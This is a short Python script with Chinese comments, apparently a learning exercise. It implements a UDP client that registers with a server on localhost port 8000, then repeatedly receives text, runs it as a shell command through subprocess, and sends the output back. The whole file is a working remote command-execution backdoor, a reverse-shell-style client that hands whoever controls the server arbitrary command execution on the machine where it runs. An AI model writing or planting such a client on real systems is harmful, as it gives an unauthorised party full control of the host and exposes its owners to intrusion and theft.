import socket
import subprocess

c = socket.socket(type=socket.SOCK_DGRAM)

c.sendto(b'client add listen', ('localhost', 8000))     # 发数据给服务端，不加服务端会出现bug（相当于初始化操作）

while True:
    data, _ = c.recvfrom(10240)      # _ 表示地址（已知，置空）
    # print(subprocess.getoutput(data.decode()))  # 运行命令
    
    # 将命令运行结果返回给服务端
    cmd = subprocess.getoutput(data.decode()).encode()
    c.sendto(cmd, ('localhost', 8000))
    # c.sendto(subprocess.getoutput(data.decode()).encode(), ('localhost', 8000))